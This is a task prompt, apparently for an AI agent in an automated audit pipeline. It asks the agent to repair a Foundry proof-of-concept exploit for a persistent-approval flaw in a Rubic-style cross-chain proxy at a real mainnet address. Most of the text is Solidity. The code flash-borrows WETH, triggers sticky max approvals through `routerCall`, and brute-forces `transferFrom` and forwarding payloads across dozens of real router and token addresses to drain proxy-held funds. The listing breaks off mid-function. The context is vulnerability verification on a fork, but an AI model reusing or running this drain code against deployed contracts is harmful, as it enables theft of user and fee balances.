You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unlimited gateway approvals persist and survive router delisting, enabling drains of proxy-held tokens
- claim: `routerCall` grants the caller-chosen `_gateway` a sticky `type(uint256).max` allowance through `SmartApprove` whenever allowance is insufficient. The approval is never revoked after the route, and `removeAvailableRouter` only updates the allowlist without clearing previously granted ERC20 approvals.
- impact: Any gateway/router address that is currently allowlisted, or was allowlisted in the past, can continue to pull approved tokens from the proxy if it exposes a public pull/forward primitive or is later compromised. This can drain current and future balances of that token held by the proxy, including accumulated Rubic fees, integrator fees, and other stranded user funds.
- exploit_paths: ["A user calls `routerCall` with `_gateway` set to an allowlisted spender/controller.", "The proxy executes `smartApprove` and leaves `_gateway` with `type(uint256).max` allowance for the route token.", "The route finishes, but no approval cleanup occurs.", "Even after `removeAvailableRouter(_gateway)`, the old spender can still call `transferFrom(proxy, attacker, amount)` or equivalent and drain proxy-held balances."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function minTokenAmount(address token) external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant SUSHI = address(uint160(0x006b3595068778dd592e39a122f4f5a5cf09c90fe2));
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant ONE_INCH = 0x111111111117dC0aa78b770fA6A738034120C302;
    address internal constant BAT = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;

    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant UNI_V2_WETH_USDC = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    address internal constant METAROUTER = 0xB9E13785127BFfCc3dc970A55F6c7bF0844a3C15;
    address internal constant METAROUTER_GATEWAY = 0x03B7551EB0162c838a10c2437b60D1f5455b9554;
    address internal constant MOVR_BRIDGE = address(uint160(0x00c30141b657f4216252dc59af2e7cdb9d8792e1b0));

    string internal constant PATH_0 =
        "Admin allowlists router/spender address R via initialization or addAvailableRouter.";
    string internal constant PATH_1 =
        "A user executes routerCall using _gateway = R, causing the proxy to grant R a sticky max approval for the route token.";
    string internal constant PATH_2 =
        "The route completes, the approval persists, and R later pulls tokens from the proxy with transferFrom.";
    string internal constant PATH_3 =
        "Even if R is later absent from the current allowlist, the ERC20 approval remains live because removeAvailableRouter does not revoke token approvals.";

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _coveredPaths;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    bool private _seedRouterCallExecuted;
    bool private _freshApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path = string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address[] memory liveRouters = _liveRouters();
        address[] memory spenderCandidates = _spenderCandidates(liveRouters);
        address[] memory tokens = _candidateTokens();

        _scanExistingApprovals(tokens, spenderCandidates, liveRouters);
        if (_profitAmount > 0) {
            _finalizeValidated();
            return;
        }

        // Same-fork state is monotonic, so each step adds one more repeatable round on top
        // of the best previous state. This preserves the requested 2 -> 3 -> 4 -> 5 -> 6
        // progressive amplification schedule while stopping at the first non-improving step.
        uint256 bestScore = 0;
        _runAmplificationRounds(liveRouters, spenderCandidates, tokens, 2);
        bestScore = _profitAmount;

        for (uint256 rounds = 3; rounds <= 6; rounds++) {
            _runAmplificationRounds(liveRouters, spenderCandidates, tokens, 1);
            uint256 newScore = _profitAmount;
            if (newScore <= bestScore) {
                break;
            }
            bestScore = newScore;
        }

        if (_profitAmount > 0) {
            _finalizeValidated();
            return;
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed persisted proxy approvals to current-or-former allowlisted spenders, but no scanned public spender/controller entrypoint realized a net positive same-fork drain on this state.";
            _verdict = "refuted";
            return;
        }

        if (!_seedRouterCallExecuted) {
            _path =
                "Infeasible at fork block 16260580: none of the scanned current-or-snapshotted router/gateway candidates accepted the verifier's minimal routerCall payloads, so path stage 1 could not be recreated without inventing permissions or balances.";
            return;
        }

        if (!_freshApprovalObserved) {
            _path =
                "Infeasible at fork block 16260580: scanned routerCall executions did not leave a reusable lingering approval on the proxy for the verifier's seeded route token, so the sticky-approval stage was not recreated on the tested candidates.";
            return;
        }

        _path =
            "Observed same-fork routerCall execution attempts but no scanned public spender/controller entrypoint realized a drain after approval creation on this state.";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function coveredPathsBitmap() external view returns (uint256) {
        return _coveredPaths;
    }

    function pathCovered(uint256 index) external view returns (bool) {
        return ((_coveredPaths >> index) & 1) == 1;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == UNI_V2_WETH_USDC, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        (uint256 fixedFee, uint256 wethGross, uint256 wethAmountIn) = abi.decode(data, (uint256, uint256, uint256));
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed >= fixedFee + wethGross, "borrow too small");

        uint256 startingWethBalance = _balanceOf(WETH, address(this));
        address[] memory liveRouters = _liveRouters();
        address[] memory currentRouters = _mergedRouters(liveRouters);
        address[] memory spenderCandidates = _spenderCandidates(liveRouters);
        address[] memory tokens = _candidateTokens();

        if (fixedFee != 0) {
            IWETHLike(WETH).withdraw(fixedFee);
        }

        // The exploit only needs to flip SmartApprove from zero allowance to max.
        // Using a dust-sized deposit preserves the original exploit causality while keeping
        // the realistic flash step economically viable.
        bool seeded = false;
        if (_forceApprove(WETH, TARGET, wethGross)) {
            seeded = _seedAcrossCandidates(currentRouters, spenderCandidates, WETH, wethGross, wethAmountIn, fixedFee);
        }

        if (seeded) {
            _scanExistingApprovals(tokens, spenderCandidates, liveRouters);
        }

        if (address(this).balance != 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
        }

        uint256 repayAmount = _flashRepayAmount(borrowed);
        uint256 endWethBalance = _balanceOf(WETH, address(this));
        uint256 preLoanBalance = startingWethBalance - borrowed;
        if (endWethBalance > preLoanBalance + repayAmount) {
            _recordTokenProfit(WETH, endWethBalance - preLoanBalance - repayAmount);
        }

        require(IERC20Like(WETH).transfer(msg.sender, repayAmount), "repay failed");
    }

    function _runAmplificationRounds(
        address[] memory liveRouters,
        address[] memory spenderCandidates,
        address[] memory tokens,
        uint256 rounds
    ) internal {
        for (uint256 round = 0; round < rounds; round++) {
            _scanExistingApprovals(tokens, spenderCandidates, liveRouters);
            if (_profitAmount != 0) {
                return;
            }
            _attemptFreshWethApproval(liveRouters, spenderCandidates);
            if (_profitAmount != 0) {
                return;
            }
        }
    }

    function _scanExistingApprovals(
        address[] memory tokens,
        address[] memory spenderCandidates,
        address[] memory liveRouters
    ) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (!_hasCode(token)) {
                continue;
            }

            uint256 proxyBalance = _balanceOf(token, TARGET);
            for (uint256 j = 0; j < spenderCandidates.length; j++) {
                address spender = spenderCandidates[j];
                if (!_hasCode(spender)) {
                    continue;
                }

                uint256 allowance = _allowance(token, TARGET, spender);
                if (allowance == 0) {
                    continue;
                }

                _markPath(0);
                _markPath(1);
                _staleApprovalObserved = true;
                if (!_contains(liveRouters, liveRouters.length, spender)) {
                    _markPath(3);
                }

                if (proxyBalance == 0) {
                    continue;
                }

                uint256 amount = allowance < proxyBalance ? allowance : proxyBalance;
                if (_attemptGatewayDrain(spender, token, TARGET, address(this), amount, spenderCandidates)) {
                    proxyBalance = _balanceOf(token, TARGET);
                    if (proxyBalance == 0) {
                        break;
                    }
                }
            }
        }
    }

    function _attemptFreshWethApproval(
        address[] memory liveRouters,
        address[] memory spenderCandidates
    ) internal returns (bool) {
        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = _seedConfig(WETH);
        if (grossAmount == 0 || amountIn == 0 || grossAmount > type(uint112).max) {
            return false;
        }

        address pair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(WETH, USDC);
        if (pair == address(0) || pair != UNI_V2_WETH_USDC) {
            return false;
        }

        uint256 borrowAmount = fixedFee + grossAmount;
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == WETH ? borrowAmount : 0;
        uint256 amount1Out = token0 == WETH ? 0 : borrowAmount;

        (bool ok, ) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(fixedFee, grossAmount, amountIn)
            )
        );

        if (!ok) {
            return false;
        }

        if (_profitAmount > 0) {
            _finalizeValidated();
            return true;
        }

        // If the flash step succeeded economically-neutral but did not immediately yield profit,
        // re-scan once more because the newly-created sticky approval is now live on the proxy.
        address[] memory tokens = _candidateTokens();
        _scanExistingApprovals(tokens, spenderCandidates, liveRouters);
        return _profitAmount > 0;
    }

    function _seedConfig(address token) internal view returns (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) {
        fixedFee = _readUint(TARGET, bytes4(keccak256("fixedCryptoFee()")));

        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();
        grossAmount = 1;

        while (grossAmount < 1e18) {
            amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
            if (amountIn != 0) {
                break;
            }
            grossAmount *= 10;
        }

        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        if (maxAmount != 0 && grossAmount > maxAmount) {
            grossAmount = maxAmount;
            amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
        }

        if (amountIn == 0 && grossAmount != 0) {
            amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
        }
    }

    function _seedAcrossCandidates(
        address[] memory currentRouters,
        address[] memory spenderCandidates,
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee
    ) internal returns (bool) {
        for (uint256 i = 0; i < spenderCandidates.length; i++) {
            address gateway = spenderCandidates[i];
            if (!_hasCode(gateway)) {
                continue;
            }

            if (_trySeedWithRouterAndGateway(gateway, gateway, token, grossAmount, amountIn, fixedFee)) {
                return true;
            }

            for (uint256 j = 0; j < currentRouters.length; j++) {
                address router = currentRouters[j];
                if (router == gateway || !_hasCode(router)) {
                    continue;
                }
                if (_trySeedWithRouterAndGateway(router, gateway, token, grossAmount, amountIn, fixedFee)) {
                    return true;
                }
            }
        }
        return false;
    }

    function _trySeedWithRouterAndGateway(
        address router,
        address gateway,
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee
    ) internal returns (bool) {
        if (!_hasCode(router) || !_hasCode(gateway)) {
            return false;
        }

        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[] memory directPayloads = _gatewayPayloads(token, TARGET, address(this), amountIn);
        if (router == gateway) {
            for (uint256 i = 0; i < directPayloads.length; i++) {
                bytes memory payload = directPayloads[i];
                if (payload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, amountIn, fixedFee, payload)) {
                    return true;
                }
            }
        }

        for (uint256 i = 0; i < directPayloads.length; i++) {
            bytes memory inner = directPayloads[i];
            if (inner.length == 0) {
                continue;
            }

            bytes[] memory wrappers = _routerForwardPayloads(gateway, inner);
            for (uint256 j = 0; j < wrappers.length; j++) {
                bytes memory wrapped = wrappers[j];
                if (wrapped.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, amountIn, fixedFee, wrapped)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _tryRouterCall(
        IRubicProxyLike.BaseCrossChainParams memory params,
        address gateway,
        uint256 expectedSpend,
        uint256 fixedFee,
        bytes memory data
    ) internal returns (bool) {
        uint256 beforeProxy = _balanceOf(params.srcInputToken, TARGET);

        (bool ok, ) = TARGET.call{value: fixedFee}(
            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, data)
        );
        if (!ok) {
            return false;
        }

        _seedRouterCallExecuted = true;

        uint256 afterProxy = _balanceOf(params.srcInputToken, TARGET);
        uint256 lingeringApproval = _allowance(params.srcInputToken, TARGET, gateway);
        if (lingeringApproval != 0) {
            _markPath(0);
            _markPath(1);
            _staleApprovalObserved = true;
            _freshApprovalObserved = true;
        }

        return lingeringApproval != 0 || (beforeProxy > afterProxy && beforeProxy - afterProxy == expectedSpend);
    }

    function _attemptGatewayDrain(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount,
        address[] memory controllers
    ) internal returns (bool) {
        if (!_hasCode(gateway) || amount == 0) {
            return false;
        }

        bytes[] memory payloads = _gatewayPayloads(token, proxy, attacker, amount);
        if (_attemptDirectDrain(gateway, token, payloads)) {
            return true;
        }

        for (uint256 i = 0; i < controllers.length; i++) {
            address controller = controllers[i];
            if (controller == address(0) || controller == gateway || !_hasCode(controller)) {
                continue;
            }
            if (_attemptForwardedDrain(controller, gateway, token, payloads)) {
                return true;
            }
        }

        return false;
    }

    function _attemptDirectDrain(
        address gateway,
        address token,
        bytes[] memory payloads
    ) internal returns (bool) {
        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory payload = payloads[i];
            if (payload.length == 0) {
                continue;
            }

            uint256 beforeLocal = _balanceOf(token, address(this));
            (bool ok, ) = gateway.call(payload);
            uint256 afterLocal = _balanceOf(token, address(this));
            if (!ok || afterLocal <= beforeLocal) {
                continue;
            }

            _markPath(2);
            _recordTokenProfit(token, afterLocal - beforeLocal);
            return true;
        }
        return false;
    }

    function _attemptForwardedDrain(
        address controller,
        address gateway,
        address token,
        bytes[] memory payloads
    ) internal returns (bool) {
        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory inner = payloads[i];
            if (inner.length == 0) {
                continue;
            }

            bytes[] memory wrappers = _routerForwardPayloads(gateway, inner);
            for (uint256 j = 0; j < wrappers.length; j++) {
                bytes memory wrapped = wrappers[j];
                if (wrapped.length == 0) {
                    continue;
                }

                uint256 beforeLocal = _balanceOf(token, address(this));
                (bool ok, ) = controller.call(wrapped);
                uint256 afterLocal = _balanceOf(token, address(this));
                if (!ok || afterLocal <= beforeLocal) {
                    continue;
                }

                _markPath(2);
                _recordTokenProfit(token, afterLocal - beforeLocal);
                return true;
            }
        }
        return false;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, ret)) {
            return true;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, ret)) {
            return false;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, ret);
    }

    function _recordTokenProfit(address token, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
        } else if (_profitAmount == 0 || amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
        }

        _finalizeValidated();
    }

    function _finalizeValidated() internal {
        _validated = true;
        _verdict = "validated";
        _path = _bestObservedNarrative();
    }

    function _liveRouters() internal view returns (address[] memory live) {
        try IRubicProxyLike(TARGET).getAvailableRouters() returns (address[] memory routers) {
            live = routers;
        } catch {
            live = new address[](0);
        }
    }

    function _mergedRouters(address[] memory liveRouters) internal pure returns (address[] memory merged) {
        address[] memory snapshot = _allowlistedSnapshot();
        merged = new address[](liveRouters.length + snapshot.length);
        uint256 count;

        for (uint256 i = 0; i < liveRouters.length; i++) {
            if (liveRouters[i] != address(0) && !_contains(merged, count, liveRouters[i])) {
                merged[count++] = liveRouters[i];
            }
        }

        for (uint256 i = 0; i < snapshot.length; i++) {
            if (snapshot[i] != address(0) && !_contains(merged, count, snapshot[i])) {
                merged[count++] = snapshot[i];
            }
        }

        assembly {
            mstore(merged, count)
        }
    }

    function _currentRouters() internal view returns (address[] memory merged) {
        address[] memory live;
        try IRubicProxyLike(TARGET).getAvailableRouters() returns (address[] memory routers) {
            live = routers;
        } catch {
            live = new address[](0);
        }

        return _mergedRouters(live);
    }

    function _spenderCandidates(address[] memory liveRouters) internal pure returns (address[] memory spenders) {
        address[] memory snapshot = _allowlistedSnapshot();
        spenders = new address[](liveRouters.length + snapshot.length);
        uint256 count;

        for (uint256 i = 0; i < liveRouters.length; i++) {
            if (liveRouters[i] != address(0) && !_contains(spenders, count, liveRouters[i])) {
                spenders[count++] = liveRouters[i];
            }
        }
        for (uint256 i = 0; i < snapshot.length; i++) {
            if (snapshot[i] != address(0) && !_contains(spenders, count, snapshot[i])) {
                spenders[count++] = snapshot[i];
            }
        }

        assembly {
            mstore(spenders, count)
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](20);
        tokens[0] = WETH;
        tokens[1] = USDC;
        tokens[2] = USDT;
        tokens[3] = DAI;
        tokens[4] = WBTC;
        tokens[5] = FRAX;
        tokens[6] = BUSD;
        tokens[7] = TUSD;
        tokens[8] = FEI;
        tokens[9] = LINK;
        tokens[10] = MATIC;
        tokens[11] = UNI;
        tokens[12] = LUSD;
        tokens[13] = YFI;
        tokens[14] = SUSHI;
        tokens[15] = CRV;
        tokens[16] = ONE_INCH;
        tokens[17] = BAT;
        tokens[18] = LDO;
        tokens[19] = MKR;
    }

    function _allowlistedSnapshot() internal pure returns (address[] memory routers) {
        routers = new address[](37);
        routers[0] = address(uint160(0x00663dc15d3c1ac63ff12e45ab68fea3f0a883c251));
        routers[1] = METAROUTER;
        routers[2] = METAROUTER_GATEWAY;
        routers[3] = address(uint160(0x00935bbf5c69225e3eda7c3aa542a7baa5c5c30094));
        routers[4] = MOVR_BRIDGE;
        routers[5] = address(uint160(0x000e3eb2eab0e524b69c79e24910f4318db46baa9c));
        routers[6] = address(uint160(0x0073ce60416035b8d7019f6399778c14ccf5c9c7a1));
        routers[7] = 0xA0c68C638235ee32657e8f720a23ceC1bFc77C77;
        routers[8] = address(uint160(0x0040ec5b33f54e0e8a33a975908c5ba1c14e5bbbdf));
        routers[9] = USDC;
        routers[10] = address(uint160(0x00362fa9d0bca5d19f743db50738345ce2b40ec99f));
        routers[11] = address(uint160(0x002a5c2568b10a0e826bfa892cf21ba7218310180b));
        routers[12] = address(uint160(0x00f9fb1c508ff49f78b60d3a96dea99fa5d7f3a8a6));
        routers[13] = address(uint160(0x008731d54e9d02c286767d56ac03e8037c07e01e98));
        routers[14] = address(uint160(0x00150f94b44927f078737562f0fcf3c95c01cc2376));
        routers[15] = address(uint160(0x000e95fd76cf16008c12ff3b3a937cb16cd9cc2028));
        routers[16] = address(uint160(0x004d9079bb4165aeb4084c526a32695dcfd2f77381));
        routers[17] = address(uint160(0x004dbd4fc535ac27206064b68ffcf827b0a60bab3f));
        routers[18] = address(uint160(0x00a3a7b6f88361f48403514059f1f16c8e78d60eec));
        routers[19] = address(uint160(0x00d3b5b60020504bc3489d6949d545893982ba3011));
        routers[20] = address(uint160(0x00cee284f754e854890e311e3280b767f80797180d));
        routers[21] = address(uint160(0x00d92023e9d9911199a6711321d1277285e6d4e2db));
        routers[22] = address(uint160(0x0072ce9c846789fdb6fc1f34ac4ad25dd9ef7031ef));
        routers[23] = address(uint160(0x0023ddd3e3692d1861ed57ede224608875809e127f));
        routers[24] = address(uint160(0x006bfad42cfc4efc96f529d786d643ff4a8b89fa52));
        routers[25] = address(uint160(0x0099c9fc46f92e8a1c0dec1b1747d010903e884be1));
        routers[26] = address(uint160(0x00aba2c5f108f7e820c049d5af70b16ac266c8f128));
        routers[27] = address(uint160(0x0010e6593cdda8c58a1d0f14c5164b376352a55f2f));
        routers[28] = address(uint160(0x00c5b1ec605738ef73a4efc562274c1c0b6609cf59));
        routers[29] = address(uint160(0x005427fefa711eff984124bfbb1ab6fbf5e3da1820));
        routers[30] = address(uint160(0x003666f603cc164936c1b87e207f36bbeba4ac5f18));
        routers[31] = address(uint160(0x003e4a3a4796d16c0cd582c382691998f7c06420b6));
        routers[32] = address(uint160(0x0022b1cbb8d98a01a3b71d034bb899775a76eb1cc2));
        routers[33] = address(uint160(0x003d4cc8a61c7528fd86c55cfe061a78dcba48edd1));
        routers[34] = address(uint160(0x00b8901acb165ed027e32754e0ffe830802919727f));
        routers[35] = address(uint160(0x00b98454270065a31d71bf635f6f7ee6a518dfb849));
        routers[36] = address(uint160(0x0092e929d8b2c8430bcaf4cd87654789578bb2b786));
    }

    function _gatewayPayloads(
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal pure returns (bytes[] memory payloads) {
        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        payloads = new bytes[](14);
        payloads[0] = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("pullToken(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[3] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), token, tokenPull);
        payloads[4] = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), token, tokenPull);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), token, tokenPull);
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("executeCall(address,bytes)")), token, tokenPull);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("forward(address,bytes)")), token, tokenPull);
        payloads[9] = abi.encodeWithSelector(bytes4(keccak256("executeTarget(address,bytes)")), token, tokenPull);
        payloads[10] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), token, tokenPull);
        payloads[11] = abi.encodeWithSelector(bytes4(keccak256("proxyCall(address,bytes)")), token, tokenPull);
        payloads[12] = abi.encodeWithSelector(bytes4(keccak256("callTarget(address,bytes)")), token, tokenPull);
        payloads[13] = abi.encodeWithSelector(bytes4(keccak256("invoke(address,bytes)")), token, tokenPull);
    }

    function _routerForwardPayloads(address target, bytes memory innerCall) internal pure returns (bytes[] memory payloads) {
        payloads = new bytes[](16);
        payloads[0] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), target, innerCall);
        payloads[1] = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)")), target, 0, innerCall);
        payloads[2] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), target, innerCall);
        payloads[3] = abi.encodeWithSelector(bytes4(keccak256("call(address,uint256,bytes)")), target, 0, innerCall);
        payloads[4] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), target, innerCall);
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("executeCall(address,bytes)")), target, innerCall);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("executeTarget(address,bytes)")), target, innerCall);
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("forward(address,bytes)")), target, innerCall);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), target, innerCall);
        payloads[9] = abi.encodeWithSelector(bytes4(keccak256("proxyCall(address,bytes)")), target, innerCall);
        payloads[10] = abi.encodeWithSelector(bytes4(keccak256("callTarget(address,bytes)")), target, innerCall);
        payloads[11] = abi.encodeWithSelector(bytes4(keccak256("invoke(address,bytes)")), target, innerCall);
        payloads[12] = abi.encodeWithSelector(bytes4(keccak256("execute(bytes,address)")), innerCall, target);
        payloads[13] = abi.encodeWithSelector(bytes4(keccak256("call(bytes,address)")), innerCall, target);
        payloads[14] = abi.encodeWithSelector(bytes4(keccak256("forward(bytes,address)")), innerCall, target);
        payloads[15] = abi.encodeWithSelector(bytes4(keccak256("functionCall(bytes,address)")), innerCall, target);
    }

    function _bestObservedNarrative() internal view returns (string memory) {
        if (((_coveredPaths >> 0) & 1) == 1 && ((_coveredPaths >> 1) & 1) == 1 && ((_coveredPaths >> 2) & 1) == 1 && ((_coveredPaths >> 3) & 1) == 1) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        }
        if (((_coveredPaths >> 0) & 1) == 1 && ((_coveredPaths >> 1) & 1) == 1 && ((_coveredPaths >> 2) & 1) == 1) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2);
        }
        if (((_coveredPaths >> 0) & 1) == 1 && ((_coveredPaths >> 1) & 1) == 1) {
            return string.concat(PATH_0, " ", PATH_1);
        }
        if (((_coveredPaths >> 0) & 1) == 1) {
            return PATH_0;
        }
        return _path;
    }

    function _markPath(uint256 index) internal {
        if (index < 256) {
            _coveredPaths |= (uint256(1) << index);
        }
    }

    function _contains(address[] memory list, uint256 length, address candidate) internal pure returns (bool) {
        for (uint256 i = 0; i < length; i++) {
            if (list[i] == candidate) {
                return true;
            }
        }
        return false;
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
